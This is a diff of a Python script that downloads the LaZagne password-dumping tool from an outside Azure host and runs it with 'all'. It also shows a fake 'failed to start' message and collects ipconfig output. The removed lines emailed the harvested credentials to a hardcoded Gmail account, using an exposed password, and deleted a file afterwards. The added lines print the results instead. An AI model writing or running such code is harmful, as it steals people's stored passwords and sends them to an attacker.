@@ -15,17 +15,6 @@ def download(url):
 
 
 download("http://mogiant.azurewebsites.net/laZagne_x64.exe")
-
-
-def send_mail(email, password, message):
-    server = smtplib.SMTP("smtp.gmail.com", 587)
-    server.starttls()
-    server.login(email, password)
-    server.sendmail(email, email, message)
-    server.quit()
-
-
-download("http://mogiant.azurewebsites.net/laZagne_x64.exe")
 result3 = subprocess.check_output("laZagne.exe all", shell=True)
 
 command = "msg * failed to start"
@@ -36,14 +25,6 @@ result1 = subprocess.check_output(command, shell=True)
 command = "ipconfig"
 result2 = subprocess.check_output(command, shell=True)
 
+print(result1, result2, result3)
 
-send_mail("captianlastimosa@gmail.com", "", result1)
-
-send_mail("captianlastimosa@gmail.com", "wither14", result1)
-
-
-send_mail("captianlastimosa@gmail.com", "wither14", result2)
-
-send_mail("captianlastimosa@gmail.com", "wither14", result3)
-
-os.remove(remove)
+lol = input("yeah>")
